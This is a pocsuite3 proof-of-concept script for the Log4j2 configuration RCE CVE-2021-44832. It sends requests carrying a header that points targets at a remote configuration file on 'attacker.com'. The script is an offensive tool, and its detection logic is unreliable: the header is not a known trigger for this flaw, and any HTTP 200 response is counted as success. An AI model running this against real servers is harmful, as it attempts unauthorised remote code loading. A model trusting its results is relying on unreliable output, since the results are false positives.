from pocsuite3.api import POCBase, Output, register_poc, requests

class Log4j2POC(POCBase):
    vulID = 'CVE-2021-44832'
    version = '1.0'
    author = 's'
    vulDate = '2021-12-28'
    createDate = '2021-12-28'
    updateDate = '2021-12-28'
    references = ['https://logging.apache.org/log4j/2.x/security.html']
    name = 'Log4j2 RCE via configuration'
    appPowerLink = 'https://logging.apache.org/log4j/2.x/'
    appName = 'Log4j2'
    appVersion = '2.0 <= Log4j <= 2.17.0'
    vulType = 'Remote Code Execution'
    desc = 'Log4j2 remote code execution vulnerability via configuration file'

    def _verify(self):
        result = {}
        url = self.url
        headers = {
            "User-Agent": "Mozilla/5.0",
            "X-Log4j-Config": "http://attacker.com:8080/log4j2.xml"
        }
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['Response'] = response.text
        except requests.exceptions.RequestException as e:
            result['error'] = str(e)
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

register_poc(Log4j2POC)
